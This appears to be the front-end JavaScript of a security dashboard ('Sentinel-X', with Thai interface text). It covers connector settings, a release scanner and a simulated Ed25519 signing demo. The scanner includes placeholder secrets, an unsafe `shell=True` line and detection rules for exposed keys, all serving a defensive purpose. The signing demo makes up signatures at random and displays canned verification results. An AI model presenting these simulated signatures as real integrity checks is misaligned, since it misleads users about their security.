    if (epVal && epVal.indexOf("http://") !== 0 && epVal.indexOf("https://") !== 0) {
      if (fb) {
        fb.style.display = "block";
        fb.style.borderColor = "var(--accent-crimson)";
        fb.textContent = "ข้อผิดพลาด: Endpoint URL ต้องขึ้นต้นด้วย http:// หรือ https:// เท่านั้น";
      }
      return null;
    }

    found.provider_name = provEl ? provEl.value.trim() : found.provider_name;
    found.endpoint_url = epVal;
    found.custom_headers_json = hdrEl ? hdrEl.value.trim() || "{}" : "{}";
    found.enabled = enEl ? Boolean(enEl.checked) : false;

    const newKey = keyEl ? keyEl.value.trim() : "";
    if (newKey) {
      found.api_key_configured = true;
      found.api_key_masked = maskSecret(newKey);
    }

    saveConnectorsState();
    renderConnectorsConsole();

    if (showSavedMessage) {
      const updatedFb = document.getElementById("conn-fb-" + cid);
      if (updatedFb) {
        updatedFb.style.display = "block";
        updatedFb.style.borderColor = "var(--accent-emerald)";
        updatedFb.textContent =
          "บันทึกการตั้งค่า " +
          found.display_name +
          " เรียบร้อยแล้ว — สถานะปัจจุบัน: " +
          computeConnectorStatus(found) +
          (found.api_key_configured ? " (API Key ถูกซ่อนเป็น " + found.api_key_masked + ")" : "");
      }
    }
    return found;
  }

  function initConnectorsConsole() {
    loadConnectorsState();
    renderConnectorsConsole();

    const demoBtn = document.getElementById("btn-load-demo-connectors");
    if (demoBtn) {
      demoBtn.addEventListener("click", function () {
        connectorsState = [
          {
            connector_id: "siem_forwarder",
            display_name: "SIEM Platform Forwarder",
            description_th: "ส่งต่อข้อมูล Security Events และ Alerts ไปยังระบบ SIEM หลักขององค์กรแบบอัตโนมัติ",
            supported_examples: "Splunk Enterprise HEC, Elastic SIEM, Microsoft Sentinel, IBM QRadar",
            provider_name: "Splunk Enterprise HEC",
            endpoint_url: "https://splunk-hec.corp.example.com:8088/services/collector/event",
            api_key_masked: "••••••••9f2a",
            api_key_configured: true,
            custom_headers_json: "{\"X-Sentinel-Source\": \"Sentinel-X\"}",
            enabled: true,
            requires_endpoint: true,
            requires_api_key: true
          },
          {
            connector_id: "edr_controller",
            display_name: "EDR Endpoint Controller",
            description_th: "สั่งกักกันเครื่องปลายทาง (Host Isolation) และดึงสถานะ Endpoint เมื่อเกิด Incident รุนแรง",
            supported_examples: "CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne",
            provider_name: "CrowdStrike Falcon API",
            endpoint_url: "https://api.crowdstrike.com/devices/entities/devices-actions/v2",
            api_key_masked: "••••••••7c11",
            api_key_configured: true,
            custom_headers_json: "{}",
            enabled: true,
            requires_endpoint: true,
            requires_api_key: true
          },
          {
            connector_id: "threat_intel_feed",
            display_name: "Threat Intelligence Feed",
            description_th: "ตรวจสอบค่าบ่งชี้การโจมตี (IOC: IP, Domain, File SHA-256) กับฐานข้อมูลภัยคุกคามภายนอก",
            supported_examples: "VirusTotal, AbuseIPDB, MISP, AlienVault OTX",
            provider_name: "VirusTotal API v3",
            endpoint_url: "https://www.virustotal.com/api/v3/ip_addresses",
            api_key_masked: "••••••••4e88",
            api_key_configured: true,
            custom_headers_json: "{}",
            enabled: true,
            requires_endpoint: true,
            requires_api_key: true
          },
          {
            connector_id: "webhook_notifier",
            display_name: "Webhook / ChatOps Alert Notifier",
            description_th: "แจ้งเตือนทีม SOC ทันทีผ่านห้องแชทหรือระบบ On-call เมื่อตรวจพบ Alert ระดับ HIGH / CRITICAL",
            supported_examples: "Slack Incoming Webhooks, Microsoft Teams, Discord, PagerDuty",
            provider_name: "Slack #soc-critical-alerts",
            endpoint_url: "https://hooks.slack.com/services/T0000/B0000/SENTINELX",
            api_key_masked: "",
            api_key_configured: false,
            custom_headers_json: "{}",
            enabled: true,
            requires_endpoint: true,
            requires_api_key: false
          },
          {
            connector_id: "external_security_tool",
            display_name: "External Security Tool / SOAR",
            description_th: "เชื่อมต่อไปยังระบบบริหารจัดการเคส (Case Management) หรือรัน Playbook อัตโนมัติบน SOAR",
            supported_examples: "TheHive, Cortex XSOAR, Jira Service Management, Shuffle SOAR",
            provider_name: "TheHive 5 Case Manager",
            endpoint_url: "https://thehive.corp.example.com/api/v1/case",
            api_key_masked: "••••••••0b3d",
            api_key_configured: true,
            custom_headers_json: "{}",
            enabled: true,
            requires_endpoint: true,
            requires_api_key: false
          }
        ];
        saveConnectorsState();
        renderConnectorsConsole();
      });
    }

    const resetBtn = document.getElementById("btn-reset-connectors");
    if (resetBtn) {
      resetBtn.addEventListener("click", function () {
        connectorsState = getDefaultConnectors();
        saveConnectorsState();
        renderConnectorsConsole();
      });
    }
  }

  /* ------------------------------------------------------------------------
     7. Tab 6: Anti-REA Release Protection Studio
     ------------------------------------------------------------------------ */
  const AUDIT_PRESETS = {
    clean_release: [
      "# Workspace File Inventory: lastmy2557-png/Sentinel-X",
      "FILE: .gitignore (ignores .env, *.key, *.pem, *.p12)",
      "FILE: sentinel_x/core/config.py",
      "FILE: sentinel_x/dashboard/server.py",
      "FILE: sentinel_x/security/release_protection/manifest.py",
      "FILE: dist/sentinel-x.exe",
      "",
      "# Code Sample (Safe Parameterized & External Key Configuration):",
      "api_token = os.environ.get('SENTINEL_API_TOKEN', '')",
      "subprocess.run(['git', 'status'], check=True, shell=False)"
    ].join("\n"),
    compromised_sample: [
      "# Compromised Workspace Simulation (EXAMPLE FOR ANTI-REA SCANNER):",
      "FILE: .env (EXAMPLE sensitive environment file exposed)",
      "FILE: config/production_private.key (EXAMPLE private key file)",
      "aws_key = \"AKIA\" + \"IOSFODNN7EXAMPLE\"",
      "api_key = \"EXAMPLE_HARDCODED_SECRET_987654321\"",
      "subprocess.run(cmd, shell=True) # EXAMPLE unsafe shell invocation",
      "pdb.set_trace() # EXAMPLE leftover debug breakpoint"
    ].join("\n")
  };

  let lastAuditMarkdown = "";

  function evaluateAntiReaScan(inputText) {
    const lines = String(inputText || "").split(/\r?\n/);
    const findings = [];

    lines.forEach(function (line, idx) {
      const lineNo = idx + 1;
      const trimmed = line.trim();
      if (!trimmed) return;

      if (trimmed.indexOf("FILE: .env") !== -1 || trimmed.indexOf(".key") !== -1) {
        findings.push({
          severity: "CRITICAL",
          rule_id: "FILE-SENSITIVE-EXPOSURE",
          line: lineNo,
          description: "Sensitive file (.env or *.key) detected in release tree",
          redacted_evidence: trimmed.slice(0, 80)
        });
      }
      if (trimmed.indexOf("AKIA") !== -1) {
        findings.push({
          severity: "CRITICAL",
          rule_id: "SEC-AWS-AKIA",
          line: lineNo,
          description: "AWS Access Key ID pattern detected",
          redacted_evidence: "aws_key = \"AKI***REDACTED***\""
        });
      }
      if (/api_key\s*=\s*["'][^"']{10,}["']/i.test(trimmed)) {
        findings.push({
          severity: "CRITICAL",
          rule_id: "SEC-GENERIC-ASSIGN",
          line: lineNo,
          description: "Hardcoded API Key / Secret assignment detected",
          redacted_evidence: "api_key = \"EXA***REDACTED***\""
        });
      }
      if (trimmed.indexOf("shell=True") !== -1) {
        findings.push({
          severity: "HIGH",
          rule_id: "CFG-UNSAFE-SHELL-TRUE",
          line: lineNo,
          description: "Subprocess invocation with shell=True detected",
          redacted_evidence: trimmed
        });
      }
      if (trimmed.indexOf("pdb.set_trace()") !== -1 || trimmed.indexOf("breakpoint()") !== -1) {
        findings.push({
          severity: "HIGH",
          rule_id: "DBG-BREAKPOINT-CODE",
          line: lineNo,
          description: "Interactive debugger breakpoint left in code",
          redacted_evidence: trimmed
        });
      }
    });

    const status = findings.length === 0 ? "PASSED" : "FAILED";
    const critCount = findings.filter(function (f) { return f.severity === "CRITICAL"; }).length;
    const highCount = findings.filter(function (f) { return f.severity === "HIGH"; }).length;

    const mdLines = [
      "# Sentinel-X Release Protection (Anti-REA) Security Audit Report",
      "- **Generated At (UTC):** `" + new Date().toISOString() + "`",
      "- **Overall Audit Status:** **`" + status + "`**",
      "- **Total Findings:** `" + findings.length + "` (`CRITICAL: " + critCount + "`, `HIGH: " + highCount + "`)",
      "",
      "## Security Scope & Honest Limitations",
      "> Sentinel-X Release Protection (Anti-REA) provides Tamper Detection, Release Integrity Verification, Signed Release Manifest authentication, Build Hardening checks, and Sensitive Artifact Exposure Reduction. No software can guarantee 100% prevention against reverse engineering.",
      "",
      "## Detailed Security Findings"
    ];

    if (findings.length === 0) {
      mdLines.push("- No secrets, sensitive files, debug artifacts, or build misconfigurations detected.");
    } else {
      findings.forEach(function (f) {
        mdLines.push(
          "- **[" + f.severity + "] `" + f.rule_id + "` (Line " + f.line + "):** " +
          f.description + " — Evidence: `" + f.redacted_evidence + "`"
        );
      });
    }

    lastAuditMarkdown = mdLines.join("\n");
    return { status: status, findings: findings, markdown: lastAuditMarkdown };
  }

  function initAntiReaStudio() {
    const scanInput = document.getElementById("antirea-scan-input");
    const scanOutput = document.getElementById("antirea-audit-output");
    const scanBadge = document.getElementById("antirea-audit-badge");
    const runScanBtn = document.getElementById("btn-run-antirea-scan");
    const dlAuditBtn = document.getElementById("btn-download-audit-md");

    const renderAudit = function (text) {
      const res = evaluateAntiReaScan(text);
      if (scanOutput) scanOutput.textContent = res.markdown;
      if (scanBadge) {
        scanBadge.textContent = res.status + " · " + res.findings.length + " FINDINGS";
        scanBadge.className = "severity-pill " + (res.status === "PASSED" ? "sev-PASSED" : "sev-CRITICAL");
      }
    };

    if (scanInput) {
      scanInput.value = AUDIT_PRESETS.clean_release;
      renderAudit(scanInput.value);
    }

    document.querySelectorAll("[data-audit-preset]").forEach(function (btn) {
      btn.addEventListener("click", function () {
        const key = btn.getAttribute("data-audit-preset");
        if (scanInput && AUDIT_PRESETS[key]) {
          scanInput.value = AUDIT_PRESETS[key];
          renderAudit(scanInput.value);
        }
      });
    });

    if (runScanBtn && scanInput) {
      runScanBtn.addEventListener("click", function () {
        renderAudit(scanInput.value);
      });
    }

    if (dlAuditBtn) {
      dlAuditBtn.addEventListener("click", function () {
        downloadTextFile("sentinel-x-antirea-audit.md", lastAuditMarkdown || "# Audit Report", "text/markdown;charset=utf-8");
      });
    }

    // Ed25519 Signing & Tamper Simulator
    const manifestPre = document.getElementById("ed25519-manifest-output");
    const verifyPre = document.getElementById("ed25519-verify-output");
    const verifyBadge = document.getElementById("ed25519-verify-badge");
    const keyIndicator = document.getElementById("ed25519-key-indicator");

    let currentKeyId = "ed25519-pub-8f91a2c4";
    let currentSig = "9a7d4e21b8c04f12e6a59012c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b04";

    const renderEd25519State = function (isTampered) {
      const manifestObj = {
        schema: "sentinel_x.release_manifest.v1",
        version: liveVersionInfo.version,
        signature_algorithm: "Ed25519 (RFC 8032)",
        public_key_id: currentKeyId,
        inventory_sha256: "f8fcf2e2c2b24f913b91824b7edebd75da0d9a3b026e1ab6baa73df423563c8f",
        signature_hex: currentSig,
        files: [
          {
            path: "dist/sentinel-x.exe",
            sha256: liveVersionInfo.exe_sha256
          },
          {
            path: "sentinel_x/dashboard/server.py",
            sha256: "c18499a27364f01928374655aabbccddeeff00112233445566778899aabbccdd"
          },
          {
            path: liveVersionInfo.patch_file,
            sha256: liveVersionInfo.patch_sha256
          }
        ]
      };

      const verifyObj = isTampered
        ? {
            verified: false,
            signature_verified: true,
            integrity_verified: false,
            status: "TAMPER_DETECTED",
            signature_algorithm: "Ed25519",
            modified_files: ["dist/sentinel-x.exe (SHA-256 mismatch: expected " + liveVersionInfo.exe_sha256.slice(0, 12) + "... got 0000deadbeef...)"],
            missing_files: [],
            unexpected_files: ["backdoor_injected.py"],
            summary: "ALERT: Release integrity check FAILED — 1 modified file and 1 unauthorized file detected!"
          }
        : {
            verified: true,
            signature_verified: true,
            integrity_verified: true,
            status: "VERIFIED_AUTHENTIC",
            signature_algorithm: "Ed25519",
            modified_files: [],
            missing_files: [],
            unexpected_files: [],
            summary: "Ed25519 digital signature VALID; All release file SHA-256 hashes match manifest."
          };

      if (manifestPre) manifestPre.textContent = JSON.stringify(manifestObj, null, 2);
      if (verifyPre) verifyPre.textContent = JSON.stringify(verifyObj, null, 2);
      if (verifyBadge) {
        verifyBadge.textContent = isTampered ? "TAMPER DETECTED · FAILED" : "VERIFIED · VALID";
        verifyBadge.className = "severity-pill " + (isTampered ? "sev-CRITICAL" : "sev-PASSED");
      }
      if (keyIndicator) {
        keyIndicator.textContent = "Key ID: " + currentKeyId;
      }
    };

    renderEd25519State(false);

    const btnKeygen = document.getElementById("btn-ed25519-keygen");
    const btnSign = document.getElementById("btn-ed25519-sign");
    const btnVerify = document.getElementById("btn-ed25519-verify");
    const btnTamper = document.getElementById("btn-ed25519-tamper");

    if (btnKeygen) {
      btnKeygen.addEventListener("click", function () {
        const randHex = Math.floor(Math.random() * 0xffffffff).toString(16).padStart(8, "0");
        currentKeyId = "ed25519-pub-" + randHex;
        renderEd25519State(false);
      });
    }
    if (btnSign) {
      btnSign.addEventListener("click", function () {
        const randHex = Math.floor(Math.random() * 0xffffffff).toString(16).padStart(8, "0");
        currentSig = randHex + currentSig.slice(8);
        renderEd25519State(false);
      });
    }
    if (btnVerify) {
      btnVerify.addEventListener("click", function () {
        renderEd25519State(false);
      });
    }
    if (btnTamper) {
      btnTamper.addEventListener("click", function () {
        renderEd25519State(true);
      });
    }
  }

  /* ------------------------------------------------------------------------
     8. Tab 7: Release Download Center, SHA-256 Verifier & Live Patch Viewer
     ------------------------------------------------------------------------ */
  function initReleaseAndPatchCenter() {
    const fileInput = document.getElementById("sha256-file-input");
    const verifyBtn = document.getElementById("btn-verify-local-file");
    const verifyRes = document.getElementById("sha256-verify-result");
    const statusPill = document.getElementById("file-verify-status-pill");

    if (verifyBtn && fileInput) {
      verifyBtn.addEventListener("click", function () {
        const file = fileInput.files && fileInput.files[0];
        if (!file) {
          if (verifyRes) {
            verifyRes.style.display = "block";
            verifyRes.style.borderColor = "var(--accent-amber)";
            verifyRes.textContent = "กรุณาเลือกไฟล์จากเครื่องของคุณก่อนกดตรวจสอบ SHA-256";
          }
          return;
        }

        const reader = new FileReader();
        reader.onload = function (ev) {
          const buffer = ev.target.result;
          if (!window.crypto || !window.crypto.subtle) return;
          window.crypto.subtle.digest("SHA-256", buffer).then(function (hashBuf) {
            const hashArray = Array.from(new Uint8Array(hashBuf));
            const hexHash = hashArray.map(function (b) { return b.toString(16).padStart(2, "0"); }).join("");

            const matchesExe = hexHash.toLowerCase() === (liveVersionInfo.exe_sha256 || "").toLowerCase();
            const matchesPatch = hexHash.toLowerCase() === (liveVersionInfo.patch_sha256 || "").toLowerCase();
            const isKnownOfficial = matchesExe || matchesPatch;

            if (verifyRes) {
              verifyRes.style.display = "block";
              verifyRes.style.borderColor = isKnownOfficial ? "var(--accent-emerald)" : "var(--accent-primary)";
              verifyRes.textContent = JSON.stringify({
                file_name: file.name,
                file_size_bytes: file.size,
                computed_sha256: hexHash,
                official_exe_sha256: liveVersionInfo.exe_sha256,
                official_patch_sha256: liveVersionInfo.patch_sha256,
                verification_result: matchesExe
                  ? "MATCHED_OFFICIAL_EXE (ตรงกับไฟล์ sentinel-x.exe ทางการ 100%)"
                  : matchesPatch
                  ? "MATCHED_OFFICIAL_PATCH (ตรงกับไฟล์ latest.patch ทางการ 100%)"
                  : "CUSTOM_FILE_HASH_COMPUTED (คำนวณค่า SHA-256 สำเร็จ)"
              }, null, 2);
            }
            if (statusPill) {
              statusPill.textContent = isKnownOfficial ? "VERIFIED OFFICIAL FILE ✓" : "SHA-256 COMPUTED";
              statusPill.className = "severity-pill " + (isKnownOfficial ? "sev-PASSED" : "sev-INFO");
            }
          });
        };
        reader.readAsArrayBuffer(file);
      });
    }

    const scrollPatchBtn = document.getElementById("btn-scroll-to-patch-viewer");
    if (scrollPatchBtn) {
      scrollPatchBtn.addEventListener("click", function () {
        const box = document.getElementById("patch-viewer-box");
        if (box) box.scrollIntoView({ behavior: "smooth" });
      });
    }

    const copyPatchBtn = document.getElementById("btn-copy-patch-diff");
    const patchPre = document.getElementById("live-patch-diff-output");
    if (copyPatchBtn && patchPre) {
      copyPatchBtn.addEventListener("click", function () {
        copyTextToClipboard(patchPre.textContent || "", copyPatchBtn, "คัดลอก Patch แล้ว");
      });
    }

    const reloadPatchBtn = document.getElementById("btn-reload-live-patch");
    if (reloadPatchBtn) {
      reloadPatchBtn.addEventListener("click", function () {
        loadLiveVersionAndPatchData();
      });
    }
  }

  function loadLiveVersionAndPatchData() {
    fetch("/version.json")
      .then(function (res) {
        if (!res.ok) throw new Error("Failed to load version.json");
        return res.json();
      })
      .then(function (data) {
        liveVersionInfo = Object.assign(liveVersionInfo, data);
        document.querySelectorAll("[data-live-version]").forEach(function (node) {
          node.textContent = "v" + data.version;
        });
        const exeHashNode = document.getElementById("live-exe-sha256");
        if (exeHashNode && data.exe_sha256) {
          exeHashNode.textContent = data.exe_sha256;
        }
        const relExeHash = document.getElementById("release-exe-sha256");
        if (relExeHash && data.exe_sha256) {
          relExeHash.textContent = "SHA-256: " + data.exe_sha256;
        }
        const relPatchHash = document.getElementById("release-patch-sha256");
        if (relPatchHash && data.patch_sha256) {
          relPatchHash.textContent = "SHA-256 (" + data.patch_file + "): " + data.patch_sha256;
        }
      })
      .catch(function () {});

    // Load PATCH_MANIFEST.json
    const historyTbody = document.getElementById("patch-history-tbody");
    fetch("/patches/PATCH_MANIFEST.json")
      .then(function (res) {
        if (!res.ok) throw new Error("No local PATCH_MANIFEST.json");
        return res.json();
      })
      .then(function (manifest) {
        const list = Array.isArray(manifest.history) ? manifest.history : [];
        if (historyTbody && list.length > 0) {
          historyTbody.innerHTML = list.map(function (item) {
            return (
              "<tr>" +
              "<td><span class=\"severity-pill sev-PASSED\">" + escapeHtml(item.tag || ("v" + item.to_version)) + "</span></td>" +
              "<td><code>v" + escapeHtml(item.from_version) + "</code></td>" +
              "<td><code>" + escapeHtml(item.patch_file) + "</code></td>" +
              "<td><code style=\"font-size:0.75rem;\">" + escapeHtml((item.patch_sha256 || "").slice(0, 24)) + "...</code></td>" +
              "<td>" + escapeHtml(item.summary) + "</td>" +
              "</tr>"
            );
          }).join("");
        }
      })
      .catch(function () {
        if (historyTbody) {
          historyTbody.innerHTML =
            "<tr><td><span class=\"severity-pill sev-PASSED\">v" +
            escapeHtml(liveVersionInfo.version) +
            "</span></td><td><code>v0.1.2</code></td><td><code>" +
            escapeHtml(liveVersionInfo.patch_file) +
            "</code></td><td><code>" +
            escapeHtml((liveVersionInfo.patch_sha256 || "").slice(0, 24)) +
            "...</code></td><td>Make all website tabs 100% interactive on Vercel</td></tr>";
        }
      });

    // Load latest.patch text
    const patchPre = document.getElementById("live-patch-diff-output");
    fetch("/patches/latest.patch")
      .then(function (res) {
        if (!res.ok) throw new Error("Failed to fetch latest.patch");
        return res.text();
      })
      .then(function (diffText) {
        if (patchPre) {
          patchPre.textContent = diffText.slice(0, 18000) + (diffText.length > 18000 ? "\n\n... [แสดงตัวอย่าง 18,000 ตัวอักษรแรก — กดดาวน์โหลด latest.patch เพื่อดูไฟล์เต็ม]" : "");
        }
      })
      .catch(function () {
        if (patchPre) {
          patchPre.textContent =
            "# Sentinel-X Official Patch File\n# Apply Command: git apply patches/latest.patch\n# (สามารถกดปุ่มดาวน์โหลด latest.patch ด้านบนเพื่อรับไฟล์เต็ม)";
        }
      });
  }

  /* ------------------------------------------------------------------------
     Initialize All Interactive Consoles on DOMContentLoaded
     ------------------------------------------------------------------------ */
  document.addEventListener("DOMContentLoaded", function () {
    initMainTabSwitcher();
    initTerminalTabs();
    initSocDashboard();
    initSimulatorAndSigma();
    initConnectorsConsole();
    initAntiReaStudio();
    initReleaseAndPatchCenter();
    loadLiveVersionAndPatchData();
  });
})();
